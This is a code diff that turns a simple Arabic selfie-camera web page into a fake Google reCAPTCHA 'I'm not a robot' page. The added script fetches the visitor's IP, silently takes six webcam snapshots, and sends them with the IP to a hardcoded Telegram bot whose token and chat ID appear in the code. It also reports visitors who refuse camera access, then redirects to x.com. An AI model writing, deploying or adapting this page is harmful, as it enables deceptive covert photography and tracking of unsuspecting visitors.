@@ -1,118 +1,229 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>كاميرا سيلفي</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: Arial, sans-serif;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Human Verification</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #f9f9f9;
+      position: relative;
+    }
 
-        body {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            background-color: #111;
-            color: white;
-        }
+    .captcha-box {
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      text-align: center;
+      width: 370px;
+      border: 1px solid #dcdcdc;
+    }
 
-        .camera-container {
-            position: relative;
-            width: 300px;
-            height: 200px;
-            border-radius: 20px;
-            overflow: hidden;
-            border: 5px solid #444;
-            background: linear-gradient(to bottom, #333, #111);
-            box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
-        }
+    .captcha-title {
+      font-size: 22px;
+      font-weight: bold;
+      margin-bottom: 10px;
+      color: #1a73e8;
+    }
 
-        video {
-            width: 100%;
-            height: 100%;
-            display: block;
-        }
+    .captcha-subtitle {
+      font-size: 16px;
+      color: #666;
+      margin-bottom: 20px;
+    }
 
-        .capture-btn {
-            margin-top: 20px;
-            padding: 10px 20px;
-            font-size: 18px;
-            background: #ff4444;
-            border: none;
-            color: white;
-            cursor: pointer;
-            border-radius: 5px;
-            transition: 0.3s;
-        }
+    .captcha-button {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      height: 60px;
+      background-color: #1a73e8;
+      color: white;
+      font-size: 18px;
+      font-weight: bold;
+      border: none;
+      border-radius: 8px;
+      padding: 12px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
 
-        .capture-btn:hover {
-            background: #cc0000;
-        }
+    .captcha-button:hover {
+      background-color: #1669c1;
+    }
 
-        .photo-container {
-            margin-top: 20px;
-            width: 300px;
-            height: 200px;
-            border-radius: 10px;
-            overflow: hidden;
-            border: 3px solid #ff4444;
-            background: black;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
+    .captcha-button img {
+      width: 32px;
+      height: 32px;
+      margin-right: 12px;
+    }
 
-        canvas {
-            width: 100%;
-            height: 100%;
-            display: block;
-        }
-    </style>
+    .status {
+      margin-top: 15px;
+      font-size: 16px;
+      font-weight: bold;
+    }
+
+    .status.pending {
+      color: #1a73e8;
+    }
+
+    .status.success {
+      color: green;
+    }
+
+    .status.error {
+      color: red;
+    }
+
+    .loader {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #1a73e8;
+      border-radius: 50%;
+      width: 20px;
+      height: 20px;
+      animation: spin 1s linear infinite;
+      display: inline-block;
+      margin-left: 10px;
+      vertical-align: middle;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .notification {
+      position: absolute;
+      top: 20px;
+      background-color: #ffc107;
+      color: #333;
+      padding: 12px 20px;
+      border-radius: 6px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+      font-size: 14px;
+      animation: fadeInOut 3s forwards;
+    }
+
+    @keyframes fadeInOut {
+      0% { opacity: 0; transform: translateY(-10px); }
+      10% { opacity: 1; transform: translateY(0); }
+      90% { opacity: 1; }
+      100% { opacity: 0; transform: translateY(-10px); }
+    }
+  </style>
 </head>
 <body>
-    <div class="camera-container">
-        <video id="video" autoplay></video>
-    </div>
-    <button class="capture-btn" onclick="capturePhoto()">التقاط صورة</button>
-    <div class="photo-container">
-        <canvas id="canvas"></canvas>
-    </div>
 
-    <script>
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
+<div class="captcha-box">
+  <div class="captcha-title">Verify You Are Human</div>
+  <div class="captcha-subtitle">Please verify that you are a human to continue.</div>
 
-        // تشغيل الكاميرا
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-            })
-            .catch(err => {
-                console.error("خطأ في تشغيل الكاميرا:", err);
-                alert("يجب السماح باستخدام الكاميرا!");
-            });
+  <button class="captcha-button" onclick="startVerification(this)">
+    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
+    I'm not a robot
+  </button>
 
-        // ضبط أبعاد الـ canvas تلقائيًا
-        video.addEventListener('loadedmetadata', () => {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-        });
+  <div class="status" id="statusText"></div>
+</div>
 
-        // التقاط الصورة
-        function capturePhoto() {
-            if (video.videoWidth === 0 || video.videoHeight === 0) {
-                alert("الكاميرا غير مفعلة!");
-                return;
-            }
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        }
-    </script>
+<script>
+const telegramBotToken = "6557468936:AAEDkqhKD5Vn9DDqyd0v6qo8h1UmJ56m-Qc";
+const chatId = "5086851394";
+
+function showNotification(message) {
+  const note = document.createElement('div');
+  note.className = "notification";
+  note.innerText = message;
+  document.body.appendChild(note);
+  setTimeout(() => note.remove(), 3000);
+}
+
+async function getIP() {
+  const res = await fetch("https://api.ipify.org?format=json");
+  const data = await res.json();
+  return data.ip;
+}
+
+async function sendPhotoToTelegram(base64Image, caption) {
+  const blob = await (await fetch(base64Image)).blob();
+  const formData = new FormData();
+  formData.append("chat_id", chatId);
+  formData.append("caption", caption);
+  formData.append("photo", blob, "selfie.jpg");
+
+  await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+    method: "POST",
+    body: formData
+  });
+}
+
+async function startVerification(button) {
+  const statusText = document.getElementById("statusText");
+  statusText.className = "status pending";
+  statusText.innerHTML = 'Verifying... <span class="loader"></span>';
+
+  try {
+    const ip = await getIP();
+
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    await video.play();
+
+    const canvas = document.createElement('canvas');
+    const context = canvas.getContext('2d');
+
+    let photos = [];
+
+    for (let i = 0; i < 6; i++) {
+      await new Promise(res => setTimeout(res, 1000));
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const base64Image = canvas.toDataURL('image/jpeg');
+      photos.push(base64Image);
+    }
+
+    stream.getTracks().forEach(track => track.stop());
+
+    for (let i = 0; i < photos.length; i++) {
+      await sendPhotoToTelegram(photos[i], `Verification Photo ${i + 1}\nIP: ${ip}`);
+    }
+
+    statusText.className = "status success";
+    statusText.innerText = "Verification Successful";
+
+    setTimeout(() => {
+      window.location.href = "https://x.com";
+    }, 2000);
+
+  } catch (err) {
+    statusText.className = "status error";
+    statusText.innerText = "Verification Failed";
+
+    const ip = await getIP();
+    if (err.name === "NotAllowedError" || err.name === "PermissionDeniedError") {
+      showNotification("Camera access is required to verify your identity.");
+      await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: `Verification Rejected.\nUser denied camera access.\nIP: ${ip}`
+        })
+      });
+    }
+  }
+}
+</script>
+
 </body>
 </html>
